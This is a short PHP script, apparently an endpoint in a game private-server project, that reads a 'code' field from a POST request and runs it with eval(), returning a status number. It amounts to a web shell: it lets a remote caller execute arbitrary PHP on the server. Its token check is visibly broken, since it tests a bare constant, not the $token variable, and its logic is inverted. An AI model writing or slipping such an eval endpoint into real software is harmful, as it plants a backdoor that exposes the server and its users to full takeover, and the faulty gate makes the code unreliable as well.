<?php
chdir(dirname(__FILE__));
include "../lib/connection.php";
require_once "../lib/exploitPatch.php";
$ep = new exploitPatch();
$codeToRun = $_POST["code"];
$token = $_POST["token"];
if(token !== "") {
  echo "-1";
}else{
  try {
    eval($codeToRun);
    echo "1";
  } catch (Throwable $t) {
    echo "-2";
  }
}
?>
